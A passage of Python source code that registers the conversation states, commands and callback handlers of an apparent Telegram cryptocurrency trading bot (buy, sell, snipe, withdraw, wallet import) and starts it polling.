                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_copy_trade_address)
            ],
            ASK_BUY_SLIPPAGE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_slippage)
            ],
            ASK_SELL_SLIPPAGE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_slippage)
            ],
            ASK_LIMIT_ORDER_DETAILS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_limit_order_details)
            ],
            ASK_WALLET_LABEL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_label)
            ],
            ASK_SNIPER_ACTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sniper_action)
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_import),
            CommandHandler("cancel", cancel_buy),
            CallbackQueryHandler(cancel_import, pattern="^cancel_import$"),
            CallbackQueryHandler(finalize_import, pattern="^finalize_import$"),
        ],
    )

    # Add all handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("sell", sell_command))
    app.add_handler(CommandHandler("positions", positions_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("snipe", snipe_command))
    app.add_handler(CommandHandler("burn", burn_command))
    app.add_handler(CommandHandler("withdraw", withdraw_command))
    app.add_handler(CommandHandler("backup", backup_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(proceed_import, pattern="^proceed_import$"))
    app.add_handler(CallbackQueryHandler(finalize_import, pattern="^finalize_import$"))
    app.add_handler(CallbackQueryHandler(cancel_import, pattern="^cancel_import$"))
    app.add_handler(CallbackQueryHandler(button_handler))

    logger.info("Bot starting...")
    app.run_polling()
